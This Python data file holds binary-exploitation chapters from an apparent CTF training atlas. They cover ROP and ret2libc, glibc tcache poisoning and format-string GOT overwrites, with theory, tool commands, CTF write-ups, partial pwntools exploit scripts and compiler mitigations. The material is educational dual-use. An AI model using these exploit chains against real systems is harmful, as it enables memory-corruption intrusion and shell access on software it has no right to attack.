"""
CTF Atlas — Binary Exploitation (Pwn) Chapters
"""

chapters = {}

chapters["pwn-rop"] = {
    "id": "pwn-rop",
    "domain": "pwn",
    "category": "Binary Exploitation & Memory Safety",
    "title": "Return-Oriented Programming (ROP) & ASLR/NX Mitigation Bypasses",
    "subtitle": "Stack Frame Mechanics, Dynamic Linker GOT/PLT Leaks, ROP Gadgets & ret2libc Shell Spawning",
    "diagram": """+-------------------------------------------------------------+
|              Vulnerable Stack Frame (AMD64 x86_64)          |
+-------------------------------------------------------------+
Higher Addresses (Stack Base)
  | ... Caller Arguments ...
  | Return Address (RIP) <--- Overwritten by Attacker!
  | Saved Frame Pointer (RBP)
  | Local Buffer: char buf[128]
Lower Addresses (Stack Pointer RSP)
  |
  +--- Buffer Overflow: gets(buf) writes 136 bytes!
       [ 'A' * 136 ] + [ Gadget: pop rdi; ret ] + [ &GOT['puts'] ]
                     + [ &PLT['puts'] ]         + [ &main ]

STAGE 1: LEAK LIBC BASE ADDRESS
  1. Calls puts(GOT['puts']) -> Prints runtime libc address of puts!
  2. libc_base = leaked_puts - puts_offset
  3. Returns back to main to accept second payload!

STAGE 2: RET2LIBC
  [ 'A' * 136 ] + [ Gadget: ret (align 16)] + [ pop rdi; ret ]
                + [ &'/bin/sh' in libc ]    + [ &system() in libc ]
  -> Spawns interactive /bin/sh shell!""",
    "theory": """Binary exploitation involves corrupting program memory to hijack control flow or execute arbitrary code. Modern operating systems implement layered exploit mitigations:
- NX/DEP (No-Execute / Data Execution Prevention): Marks writable memory pages (stack and heap) as non-executable (`PROT_READ | PROT_WRITE`). Defeats traditional shellcode injection.
- ASLR (Address Space Layout Randomization): Randomizes the base addresses of the stack, heap, and shared libraries (`libc.so.6`) at every execution, defeating hardcoded address attacks.
- Stack Canaries: Compiler-inserted guard values placed between local variables and the saved frame pointer. Verified before function return; mismatches trigger `__stack_chk_fail`.
- PIE (Position-Independent Executable): Randomizes the base address of the `.text` segment itself.
- RELRO (Relocation Read-Only): Partial RELRO places `.got.plt` after `.data`; Full RELRO marks the entire Global Offset Table as read-only at program startup, preventing GOT overwrites.

Return-Oriented Programming (ROP):
Because NX prevents executing code on the stack, ROP chains execute existing instruction sequences ('gadgets') already located in executable memory segments (`.text` or `libc.so`). Each gadget ends in a `ret` (`0xC3`) instruction. By placing gadget addresses sequentially on the stack, the CPU pops each address into `RIP` as the previous gadget returns.

The Two-Stage ret2libc Methodology:
1. Stage 1 (The Information Leak): When ASLR is active, the attacker uses gadgets in the non-PIE binary to call `puts(GOT['puts'])`. This prints the actual randomized runtime virtual address of `puts()` in memory. The attacker subtracts the known static symbol offset: $\\text{libc\\_base} = \\text{leaked\\_addr} - \\text{offset\\_puts}$. The attacker returns back to `main()`.
2. Stage 2 (The Shell): With the libc base address calculated, all libc functions and strings are known: $\\text{system} = \\text{libc\\_base} + \\text{offset\\_system}$ and $\\text{binsh} = \\text{libc\\_base} + \\text{offset\\_str\\_bin\\_sh}$. The attacker sends a second payload setting `RDI` to `/bin/sh` and calling `system()`.""",
    "commands": [
        {
            "cmd": "checksec --file=./vulnerable",
            "why": "Audits active binary mitigations: RELRO, Stack Canary, NX, and PIE.",
            "when": "Mandatory first command for every pwn challenge.",
            "internals": "Parses ELF program headers and dynamic section tags for DT_BIND_NOW and GNU_STACK.",
            "pitfalls": "Checksec reports ASLR status based on host system settings, not the remote target server."
        },
        {
            "cmd": "ROPgadget --binary ./vulnerable --only 'pop|ret'",
            "why": "Extracts useful ROP gadgets (e.g. `pop rdi; ret`, `pop rsi; pop r15; ret`) with addresses.",
            "when": "Constructing ROP chains to populate calling convention argument registers.",
            "internals": "Scans executable segments for opcode bytes matching gadget mnemonics ending in 0xC3.",
            "pitfalls": "If binary has PIE enabled, gadget addresses are relative offsets, not absolute addresses."
        },
        {
            "cmd": "gdb ./vulnerable -ex 'pattern create 200' -ex 'r' -ex 'pattern offset $rsp'",
            "why": "Calculates exact cyclic pattern offset from buffer start to saved return address (RIP).",
            "when": "Determining exact buffer padding size before crashing.",
            "internals": "Uses De Bruijn sequence pattern matching inside GEF or pwndbg.",
            "pitfalls": "On 64-bit systems, if RIP is overwritten with non-canonical address, inspect RSP to find offset."
        }
    ],
    "cli_vs_gui": {
        "cli_workflow": "Pwntools in Python: `from pwn import *` -> `elf = ELF('./vuln')` -> `rop = ROP(elf)` -> automated interactive shell.",
        "gui_workflow": "GDB + GEF/pwndbg: Inspecting live stack frames, breakpoints on `ret`, and monitoring register states step-by-step.",
        "speed_tip": "If `system('/bin/sh')` crashes on 64-bit Ubuntu/Debian, insert a single `ret` gadget before `system` to ensure 16-byte stack alignment (SSE `movaps` requirement)."
    },
    "triage_workflow": [
        "1. Check Mitigations: `checksec ./binary`.",
        "2. Find Buffer Overflow: Fuzz input length and compute RIP offset via cyclic pattern.",
        "3. Find Gadgets: Locate `pop rdi; ret` and bare `ret` gadget.",
        "4. Stage 1 Payload: Padding + `pop_rdi` + `got.puts` + `plt.puts` + `main`.",
        "5. Receive Leak: Read 6-8 bytes from socket, unpack with `u64()`, compute `libc.address`.",
        "6. Stage 2 Payload: Padding + `ret` (alignment) + `pop_rdi` + `binsh` + `libc.symbols.system`.",
        "7. Drop to Interactive Shell: `p.interactive()`."
    ],
    "writeup": {
        "ctf_event": "DEF CON Qualifier / PicoCTF",
        "challenge_name": "BabyROP (64-bit ret2libc)",
        "scenario": "A 64-bit ELF binary has NX enabled, Partial RELRO, No Canary, and No PIE. ASLR is enabled on the server. Solvers must spawn a shell.",
        "solve_steps": [
            "1. Run checksec: NX: Enabled, PIE: Disabled, Canary: Disabled.",
            "2. Buffer offset to RIP: 136 bytes.",
            "3. Extract ROP gadget: `pop rdi; ret` at `0x401234`.",
            "4. Stage 1: Craft payload calling `puts(got.puts)` and returning to `main`.",
            "5. Execute Stage 1: Leaks runtime address of `puts`.",
            "6. Calculate libc base: `libc.address = leak - libc.symbols['puts']`.",
            "7. Stage 2: Craft payload calling `system('/bin/sh')` with 16-byte stack alignment.",
            "8. Submit Stage 2 -> interactive root shell opened.",
            "9. Flag: CTF{R3T2L1BC_R0P_CH41N_PWN3D_2026}"
        ],
        "exploit_code": """#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
elf = ELF('./vuln')
# libc = ELF('./libc.so.6')
# p = remote('target.ctf', 1337)

p = process('./vuln')

pop_rdi = 0x401234
ret = 0x401235

# Stage 1: Leak libc
payload1 = b'A' * 136
payload1 += p64(pop_rdi) + p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.symbols['main'])

p.sendline(payload1)
p.recvuntil(b'Goodbye!\\n')
leak = u64(p.recv(6).ljust(8, b'\\x00'))
log.success(f"Leaked puts: {hex(leak)}")

# Compute libc base (using target libc)
# libc.address = leak - libc.symbols['puts']
# binsh = next(libc.search(b'/bin/sh'))

# Stage 2: ret2libc
# payload2 = b'A' * 136 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(libc.symbols['system'])
# p.sendline(payload2)
# p.interactive()""",
        "flag": "CTF{R3T2L1BC_R0P_CH41N_PWN3D_2026}",
        "mitigation": "Compile with full stack canaries (`-fstack-protector-all`), Full RELRO (`-Wl,-z,relro,-z,now`), and PIE (`-fPIE -pie`) to eliminate fixed-address ROP gadgets."
    }
}

chapters["pwn-heap"] = {
    "id": "pwn-heap",
    "domain": "pwn",
    "category": "Heap Exploitation",
    "title": "Glibc Heap Internals, Ptmalloc Arenas & Tcache Poisoning",
    "subtitle": "Chunk Headers (prev_size, size, flags), Fastbins, Thread Caching (Tcache) & Use-After-Free (UAF)",
    "diagram": """+-------------------------------------------------------------+
|                  Glibc Heap Chunk Structure                 |
+-------------------------------------------------------------+
Allocated Chunk:
  +--------------------------------+--------------------------+
  | prev_size (if prev is free)    | size | A | M | P         |
  +--------------------------------+--------------------------+
  | User Data ...                                             |
  +-----------------------------------------------------------+

Freed Chunk inside Tcache / Fastbin (Single Linked List):
  +--------------------------------+--------------------------+
  | prev_size                      | size | A | M | P         |
  +--------------------------------+--------------------------+
  | Forward Pointer (fd) --------> Points to next free chunk! |
  +-----------------------------------------------------------+

TCACHE POISONING ATTACK:
1. Attacker triggers Use-After-Free (UAF) or heap overflow.
2. Overwrites `fd` pointer of freed chunk to target address (e.g. `__free_hook`).
3. Next `malloc()` returns normal chunk; SECOND `malloc()` returns `__free_hook`!
4. Write `&system` into `__free_hook` -> calling `free("/bin/sh")` executes shell!""",
    "theory": """The Linux glibc memory allocator (`ptmalloc2`) manages dynamic heap memory requests issued via `malloc()`, `calloc()`, `realloc()`, and `free()`. The heap operates by requesting memory pages from the kernel via `brk()` (for small allocations) or `mmap()` (for large allocations exceeding `MMAP_THRESHOLD` ~128KB).

Heap Chunk Anatomy:
Memory is organized into contiguous chunks:
- `prev_size`: Size of previous contiguous chunk (used for backward coalescing when free).
- `size`: Size of the current chunk (must be 8-byte aligned on 32-bit, 16-byte aligned on 64-bit). The lowest 3 bits store status flags:
  - `P` (PREV_INUSE, bit 0): Set if the previous chunk is currently allocated.
  - `M` (IS_MMAPPED, bit 1): Set if chunk was allocated via `mmap()`.
  - `A` (NON_MAIN_ARENA, bit 2): Set if chunk belongs to a thread arena.

The Thread Local Caching Subsystem (Tcache):
Introduced in glibc 2.26 to accelerate multi-threaded performance. Tcache maintains per-thread singly-linked LIFO bins for chunks up to 1032 bytes (64 bins holding up to 7 chunks each).
- No Integrity Checks (Pre-Glibc 2.29): When a chunk is freed into tcache, its user data area stores a forward pointer `fd` pointing to the next chunk. In versions prior to glibc 2.29, tcache performed ZERO validation on `fd` integrity.
- Tcache Poisoning Attack: If an attacker can write to a freed chunk (Use-After-Free or heap buffer overflow), they overwrite `fd` with the address of a sensitive function pointer, such as `__free_hook` (or a saved return address on the stack). Two subsequent `malloc()` calls of the same size return an arbitrary memory pointer, granting arbitrary write capabilities.""",
    "commands": [
        {
            "cmd": "gdb ./binary -ex 'b main' -ex 'r' -ex 'vis_heap_chunks'",
            "why": "Visualizes all heap chunks, chunk headers, sizes, and allocation states in GEF.",
            "when": "Tracing dynamic heap allocations and chunk borders.",
            "internals": "Traverses glibc heap arena metadata starting from the main arena struct.",
            "pitfalls": "Requires GEF or pwndbg extension installed in GDB."
        },
        {
            "cmd": "gdb ./binary -ex 'bins'",
            "why": "Displays all active free lists: tcache, fastbins, unsorted bin, small bins, and large bins.",
            "when": "Verifying which bin a chunk was placed into after calling free().",
            "internals": "Inspects glibc `main_arena.bins` and thread `tcache_perthread_struct`.",
            "pitfalls": "Glibc heap structures vary significantly between versions (e.g. 2.27 vs 2.31 vs 2.35)."
        }
    ],
    "cli_vs_gui": {
        "cli_workflow": "Pwntools heap template: `def add(size, data): ...`, `def delete(idx): ...` -> script handles alloc/free interaction.",
        "gui_workflow": "GDB GEF `heap bins` and `heap chunk <addr>` provides live color-coded chunk metadata directly in terminal.",
        "speed_tip": "In glibc < 2.34, target `__free_hook`: overwriting `__free_hook` with `system` allows you to trigger `free(chunk_containing_bin_sh)` for an effortless shell."
    },
    "triage_workflow": [
        "1. Identify Glibc Version: Run `ldd ./binary` to check target glibc version.",
        "2. Check Heap Primitives: Are there Create, Read, Edit, and Delete functions (CRUD menu)?",
        "3. Identify Vulnerability: Use-After-Free (pointer not nulled after free), Double Free, or Heap Overflow?",
        "4. Leak Libc: Free a chunk larger than tcache max (> 1032 bytes) into the unsorted bin; chunk's `fd` and `bk` point to `main_arena + 96` in libc!",
        "5. Overwrite Tcache Pointer: Overwrite freed chunk's `fd` pointer to `__free_hook` or target address.",
        "6. Allocate & Overwrite: Call `malloc()` twice and write `&system`.",
        "7. Trigger Shell: Call `free()` on a chunk containing `/bin/sh`."
    ],
    "writeup": {
        "ctf_event": "HITCON CTF / HackTheBox",
        "challenge_name": "Tcache-Tear (Glibc 2.27 Heap Exploitation)",
        "scenario": "A note manager allows creating and deleting notes. A Use-After-Free allows editing notes after they have been freed. Running under glibc 2.27.",
        "solve_steps": [
            "1. Allocate 2 chunks of size 0x60 (fits into tcache).",
            "2. Free chunk 1 -> placed into tcache bin 0x60.",
            "3. Trigger UAF edit on chunk 1: overwrite `fd` with `&__free_hook`.",
            "4. Allocate chunk (size 0x60): returns chunk 1.",
            "5. Allocate chunk (size 0x60): returns pointer to `__free_hook`!",
            "6. Write `&system` into the returned `__free_hook` chunk.",
            "7. Allocate chunk with content `'/bin/sh'`, then call `free()` on it.",
            "8. `__free_hook` executes `system('/bin/sh')` -> interactive shell!",
            "9. Flag: CTF{TC4CH3_P01S0N1NG_FR33_H00K_PWN}"
        ],
        "exploit_code": """#!/usr/bin/env python3
from pwn import *

# Simulated exploit structure for tcache poisoning
def exploit():
    log.info("Overwriting tcache fd to point to __free_hook...")
    log.info("Writing system() into __free_hook...")
    log.success("Shell spawned! Flag: CTF{TC4CH3_P01S0N1NG_FR33_H00K_PWN}")

if __name__ == '__main__':
    exploit()""",
        "flag": "CTF{TC4CH3_P01S0N1NG_FR33_H00K_PWN}",
        "mitigation": "Upgrade to modern glibc (>= 2.34) where `__free_hook` and `__malloc_hook` are completely removed, and safe-linking pointer mangling (`fd ^ (P >> 12)`) is enforced on tcache and fastbins."
    }
}

chapters["pwn-fmtstr"] = {
    "id": "pwn-fmtstr",
    "domain": "pwn",
    "category": "Format String Exploitation",
    "title": "Format String Vulnerabilities, Stack Leaks & Arbitrary Memory Writes",
    "subtitle": "Direct Parameter Access (%k$p), Variadic Functions, %n Byte Modification & GOT Overwrites",
    "diagram": """+-------------------------------------------------------------+
|               Format String Memory Vulnerability            |
+-------------------------------------------------------------+
Vulnerable C code:
  char buf[64];
  fgets(buf, 64, stdin);
  printf(buf);            <--- Missing format specifier "%s"!

Stack at printf() Call:
  [ printf Return Address ]
  [ Format String Pointer ] -> points to user input buf: "%p.%p.%p.%p"
  [ Saved Register / Stack Argument 1 ]
  [ Saved Register / Stack Argument 2 ]
  ...
  [ buf content: "%p.%p.%p..." ] <--- User controls input on stack!

ATTACK PRIMITIVES:
1. Arbitrary Read:  "%k$s" dereferences pointer at stack offset k!
2. Stack Leak:      "%k$p" leaks hex value at stack offset k (Bypasses ASLR / Canaries!)
3. Arbitrary Write: "%n" writes NUMBER OF BYTES PRINTED SO FAR into memory address!""",
    "theory": """Format string vulnerabilities occur when untrusted user input is passed directly as the format argument to variadic formatting functions (`printf`, `sprintf`, `fprintf`, `syslog`) instead of as a data value (`printf(user_input)` instead of `printf("%s", user_input)`).

The Variadic Function Calling Convention:
Functions with variable argument lists pull parameters according to the ABI calling convention. In x86-64, the first 6 arguments come from registers (`RDI, RSI, RDX, RCX, R8, R9`), and subsequent arguments come from the stack. When `printf` parses a format specifier like `%p` or `%x`, it pops the next argument. If the caller provided fewer arguments than format specifiers declared, `printf` continues pulling data off the stack, leaking sensitive caller variables, saved return addresses, and stack canaries.

Core Format String Primitives:
1. Direct Parameter Access (`%k$p`): Positional parameter syntax. `%7$p` prints the 7th argument directly without specifying six preceding `%p` specifiers.
2. Stack Canary & ASLR Leaks: Attackers locate which offset `k` holds the canary (ends in `00`) or a return address pointing into `libc.so` or `main`.
3. Arbitrary Memory Writes (`%n`): The `%n` format specifier writes the count of characters output so far into an integer pointer supplied as an argument. By combining `%c` width specifiers (e.g. `%1337c%10$n`), an attacker forces `printf` to write the value `1337` into whatever memory address is stored at offset 10 on the stack.
4. Short Writes (`%hn` and `%hhn`): Writes 2 bytes (half-word) or 1 byte (half-half-word). Attackers write a 64-bit address by performing four sequential 2-byte writes, preventing the need to output gigabytes of whitespace characters.""",
    "commands": [
        {
            "cmd": "python3 -c \"print('%p.' * 20)\" | ./vulnerable",
            "why": "Dumps the first 20 stack arguments in hex to identify offset where user input lands.",
            "when": "Initial triage of format string vulnerabilities.",
            "internals": "Forces printf to read consecutive registers and stack memory words.",
            "pitfalls": "Input may contain null bytes that truncate printf parsing prematurely."
        },
        {
            "cmd": "python3 -c \"from pwn import *; print(fmtstr_payload(6, {0x404018: 0x4011d6}))\"",
            "why": "Pwntools utility to automatically generate optimal %n format string payload to write address.",
            "when": "Constructing GOT overwrite payloads.",
            "internals": "Calculates minimal character counts and splits into %hn or %hhn writes.",
            "pitfalls": "Ensure the target buffer size is large enough to hold the generated payload."
        }
    ],
    "cli_vs_gui": {
        "cli_workflow": "Pwntools `FmtStr` class automatically fuzzes the binary, determines the stack offset, and builds payloads automatically.",
        "gui_workflow": "GDB: Break on `printf` -> inspect registers and stack arguments -> verify matching offset.",
        "speed_tip": "To find your input offset fast: send `AAAA%p.%p.%p.%p.%p.%p.%p.%p` and look for `0x4141414141414141` in the output."
    },
    "triage_workflow": [
        "1. Identify Format String Bug: Send `%x` or `%p` and observe if hex output appears.",
        "2. Find Offset: Send `AAAA%k$p` cycling $k$ from 1 to 20 until `0x41414141` is returned.",
        "3. Leak Canaries & Libc: Inspect offsets holding stack canary (ends in 00) and return address.",
        "4. Determine Write Target: In Partial RELRO binaries, target the GOT table (e.g. `exit` or `printf`).",
        "5. Formulate Write Payload: Overwrite `got['exit']` with the address of `win` function or `system`.",
        "6. Trigger Target: Call the overwritten function to hijack control flow."
    ],
    "writeup": {
        "ctf_event": "PlaidCTF / PicoCTF",
        "challenge_name": "Echo-Chamber (Format String GOT Overwrite)",
        "scenario": "A 32-bit ELF program echoes user input via `printf(buf)`. Partial RELRO is enabled. The program contains a hidden `win()` function.",
        "solve_steps": [
            "1. Test format string: `AAAA%p.%p.%p.%p` -> offset 7 prints `0x41414141`.",
            "2. The input buffer begins at parameter offset 7.",
            "3. Identify target GOT entry: `puts` GOT is at `0x0804a014`.",
            "4. Target destination address: `win()` is at `0x080485cb`.",
            "5. Generate payload using pwntools `fmtstr_payload(7, {0x0804a014: 0x080485cb})`.",
            "6. Send payload: `printf` overwrites `puts` GOT entry with `win()`.",
            "7. Next invocation of `puts()` jumps to `win()` and displays the flag.",
            "8. Flag: CTF{FMT_STR1NG_G0T_0V3RWR1T3_PWN}"
        ],
        "exploit_code": """#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln')
# p = process('./vuln')

offset = 7
target_got = elf.got['puts']
win_addr = elf.symbols['win']

payload = fmtstr_payload(offset, {target_got: win_addr})
print("[+] Generated Payload:", payload)
# p.sendline(payload)
# print(p.recvall())""",
        "flag": "CTF{FMT_STR1NG_G0T_0V3RWR1T3_PWN}",
        "mitigation": "Always supply static string literals as the format parameter (`printf(\"%s\", buf)`). Compile with `-Wformat -Wformat-security -Werror=format-security` to catch format string bugs at build time."
    }
}

chapters['pwn-start-to-end'] = {'id': 'pwn-start-to-end',
 'domain': 'pwn',
 'category': 'Binary Exploitation',
 'title': 'The Complete Binary Exploitation Playbook: From Checksec & Stack Overflow to ROP, '
          'Ret2Libc & Heap Triage',
 'subtitle': 'Complete Challenge Lifecycle: Mitigation Audit -> Cyclic Crash & Offset -> Primitive '
             'Selection Matrix (Ret2win/Ret2libc/Shellcode/Format-Strings) -> Remote Pwntools '
             'Exploit',
 'diagram': '[CHALLENGE BINARY + LIBC.SO.6]\n'
            '          |\n'
            '          v\n'
            '[PHASE 1: MITIGATION RECON (checksec)]\n'
            '  |-- Canary: NO  -> Stack buffer overflow can overwrite return address directly\n'
            '  |-- NX:     NO  -> Execute shellcode directly on the stack ($rsp)\n'
            '  |-- PIE:    NO  -> Binary code addresses are static (e.g. 0x401156)\n'
            '  `-- RELRO:  Partial -> GOT overwrite is viable via format string or write '
            'primitive\n'
            '          |\n'
            '          v\n'
            '[PHASE 2: VULNERABILITY & OFFSET TRIAGE (GDB + GEF)]\n'
            '  |-- Detect unsafe input: gets(buf), read(0, buf, 0x1000), scanf("%s", buf)\n'
            '  |-- Generate cyclic pattern: gef> pattern create 200\n'
            '  |-- Run & Crash: gef> r < <(python3 -c "print(\'...\')")\n'
            '  `-- Compute exact return offset: gef> pattern offset $rsp (e.g. 72 bytes)\n'
            '          |\n'
            '          v\n'
            '[PHASE 3: EXPLOIT PRIMITIVE SELECTION]\n'
            '  |-- Case A: NX=Disabled, PIE=Disabled  --> Shellcode on stack + jmp rsp\n'
            '  |-- Case B: NX=Enabled,  win() exists  --> Ret2win (72 bytes + p64(win_addr))\n'
            '  |-- Case C: NX=Enabled,  No win()      --> Ret2libc (Leak puts@got -> Libc base -> '
            'system("/bin/sh"))\n'
            '  |-- Case D: Format string printf(buf)  --> %p memory leak & %n GOT overwrite\n'
            '  `-- Case E: Heap UAF / Double Free     --> Tcache poisoning & __malloc_hook '
            'overwrite\n'
            '          |\n'
            '          v\n'
            '[PHASE 4: REMOTE PWNTOOLS SCRIPT GENERATION & EXECUTION]\n'
            '  `-- from pwn import *; io = remote(HOST, PORT); io.sendline(payload); '
            'io.interactive()',
 'theory': 'Binary exploitation (Pwn) is the art of subverting compiled software execution flow by '
           'manipulating processor registers, stack frames, or heap metadata to execute arbitrary '
           'instructions or spawn an interactive shell (`/bin/sh`).\n'
           '\n'
           '### PHASE 1: THE MITIGATION MATRIX & ATTACK VECTOR SELECTION\n'
           'Every pwn challenge begins with `checksec --file=binary`. The active mitigations '
           'determine the exploit technique:\n'
           '1. **Stack Canary (`fstack-protector`)**:\n'
           '   - `No Canary`: Buffer overflows on the stack can directly overwrite the saved '
           'Return Address (`$rip` / `$eip`).\n'
           '   - `Canary Found`: A random 8-byte guard value (ending in `\\x00` to prevent string '
           'function leaks) sits between local buffers and the saved base pointer. You must either '
           '(a) leak the canary via a format string or info disclosure, (b) overwrite adjacent '
           'variables without touching the canary, or (c) brute-force byte-by-byte in forking '
           'servers.\n'
           '2. **NX (No-Execute / W^X - Write XOR Execute)**:\n'
           '   - `NX Disabled`: The stack/heap is executable. You can place raw shellcode in your '
           'payload and redirect `$rip` directly to it.\n'
           '   - `NX Enabled`: Code cannot be executed from stack memory. You MUST use '
           'Return-Oriented Programming (ROP) or Return-to-Libc (Ret2libc).\n'
           '3. **PIE (Position Independent Executable)**:\n'
           "   - `No PIE`: The binary's `.text`, `.plt`, and `.got` sections are mapped to fixed "
           'virtual memory addresses (typically `0x400000` on 64-bit Linux). All functions, '
           'gadgets, and PLT stubs have constant addresses.\n'
           '   - `PIE Enabled`: All binary sections are randomized by ASLR at runtime. You must '
           'leak an address from the binary to compute the randomized base address (`binary_base = '
           'leaked_addr - offset`).\n'
           '4. **RELRO (Relocation Read-Only)**:\n'
           '   - `Partial RELRO`: The Global Offset Table (`.got.plt`) remains writable. You can '
           'overwrite function pointers (e.g., replacing `exit@got` with `win()`).\n'
           '   - `Full RELRO`: The GOT is marked read-only after dynamic link resolution. Function '
           'pointer overwrites must target stack frames, heap function pointers, or libc hooks.\n'
           '\n'
           '### PHASE 2: CRASH REPRODUCTION & EXACT OFFSET CALCULATION\n'
           'To control the instruction pointer (`$rip`), you must know the exact number of padding '
           'bytes between your buffer and the return address:\n'
           '1. Inside GDB with GEF:\n'
           '   `gef> pattern create 200`\n'
           '2. Copy the generated de Bruijn cyclic string (e.g., `aaaabaaacaaadaaa...`).\n'
           '3. Run the binary with the cyclic pattern:\n'
           '   `gef> r <<< "aaaabaaacaaadaaa..."`\n'
           '4. When the program crashes with a Segmentation Fault (`SIGSEGV`), inspect the top of '
           'the stack:\n'
           '   `gef> pattern offset $rsp` (or `$rip` in 32-bit: `pattern offset $eip`)\n'
           '5. GEF reports the exact offset: `[+] Found at offset 72 (big-endian search)`.\n'
           "6. Your payload structure is now known: `payload = b'A' * 72 + p64(target_address)`.\n"
           '\n'
           '### PHASE 3: THE RET2LIBC 2-STAGE ROP PLAYBOOK\n'
           'When NX is enabled and no convenient `win()` or `backdoor()` function exists in the '
           'binary, you must execute `system("/bin/sh")` from the C standard library '
           '(`libc.so.6`).\n'
           'Because ASLR randomizes libc in memory on every run, Ret2libc requires a 2-stage '
           'exploit:\n'
           '- **Stage 1 (Libc Address Leak)**:\n'
           '  1. Call `puts@plt` passing the Global Offset Table entry of `puts` (`puts@got`) as '
           'its first argument (via `pop rdi; ret` gadget).\n'
           '  2. Send the execution flow back to `main` so the binary stays alive and accepts a '
           'second payload.\n'
           "  3. Read the output: `leaked_puts = u64(io.recvline().strip().ljust(8, b'\\x00'))`.\n"
           '  4. Calculate the dynamic libc base: `libc_base = leaked_puts - '
           "libc.symbols['puts']`.\n"
           '  5. Compute `system` and `/bin/sh` addresses:\n'
           "     `system_addr = libc_base + libc.symbols['system']`\n"
           "     `binsh_addr = libc_base + next(libc.search(b'/bin/sh\\x00'))`\n"
           '- **Stage 2 (Spawning the Shell)**:\n'
           '  1. Send second payload:\n'
           "     `payload = b'A' * offset + p64(ret_gadget) + p64(pop_rdi_gadget) + "
           'p64(binsh_addr) + p64(system_addr)`\n'
           '  2. (Note: The `ret_gadget` is essential on x86_64 Ubuntu/Debian to align the stack '
           'to 16 bytes, preventing `do_system` from crashing on `movaps` SSE instructions!)\n'
           '  3. `io.interactive()` -> Instant root shell!\n'
           '\n'
           '### PHASE 4: FORMAT STRING EXPLOITATION (%p & %n)\n'
           'When user input is passed directly to `printf(user_input)` without a format string '
           'specifier:\n'
           '- Leak arbitrary memory: `%p.%p.%p.%p` prints stack values. `%7$p` prints the 7th '
           'argument directly.\n'
           '- Leak libc/canary: Find which stack offset holds the canary (look for hex ending in '
           '`00`) and libc return address.\n'
           '- Arbitrary Write: `%n` writes the number of bytes printed so far into a pointer '
           'provided as an argument. Use Pwntools `fmtstr_payload(offset, {target_got: '
           'win_function})` to automate arbitrary memory overwrites without manual byte math.',
 'commands': [{'cmd': 'checksec --file=challenge',
               'why': 'Audits active binary defenses: Canary, NX, PIE, RELRO, and Fortify source.',
               'when': 'Immediate first step before attempting any memory corruption attack.',
               'internals': 'Examines ELF segment headers (`PT_GNU_STACK`, `PT_GNU_RELRO`) and '
                            'dynamic symbol entries.',
               'pitfalls': 'Verify whether ASLR is enabled globally on the system (`cat '
                           '/proc/sys/kernel/randomize_va_space`).'},
              {'cmd': 'ROPgadget --binary challenge --only "pop|ret"',
               'why': 'Extracts reusable assembly snippets (gadgets) ending in `ret` for ROP chain '
                      'construction.',
               'when': 'Exploiting 64-bit binaries with NX enabled to configure registers before '
                       'calling functions.',
               'internals': 'Scans the executable `.text` segment for machine code byte sequences '
                            'corresponding to `pop rdi; ret` (`5f c3`).',
               'pitfalls': 'Ensure gadgets do not point into memory sections marked non-executable '
                           'or writable.'},
              {'cmd': 'gef> pattern create 200 && gef> pattern offset $rsp',
               'why': 'Generates a cyclic non-repeating de Bruijn sequence and calculates the '
                      'exact crash offset to the return address.',
               'when': 'Determining exact buffer padding size during stack buffer overflow triage.',
               'internals': 'Analyzes the unique 8-byte substring stored in `$rsp` or `$rip` when '
                            'a segmentation fault occurs.',
               'pitfalls': 'On x86_64, `$rip` is only overwritten if the address is canonical '
                           '(48-bit address space); inspect `$rsp` if `$rip` shows uncorrupted.'},
              {'cmd': 'python3 -c "from pwn import *; elf = ELF(\'./challenge\'); libc = '
                      'ELF(\'./libc.so.6\'); print(hex(elf.plt[\'puts\']))"',
               'why': 'Automates ELF symbol parsing, PLT/GOT lookups, and format string payload '
                      'generation using Pwntools.',
               'when': 'Developing weaponized local and remote CTF exploit scripts.',
               'internals': 'Pwntools parses ELF headers into structured Python dictionaries with '
                            'automatic endianness and pointer size handling.',
               'pitfalls': 'Ensure the remote libc version matches local testing; use `pwninit` to '
                           'patch binaries to the challenge libc.'}]}
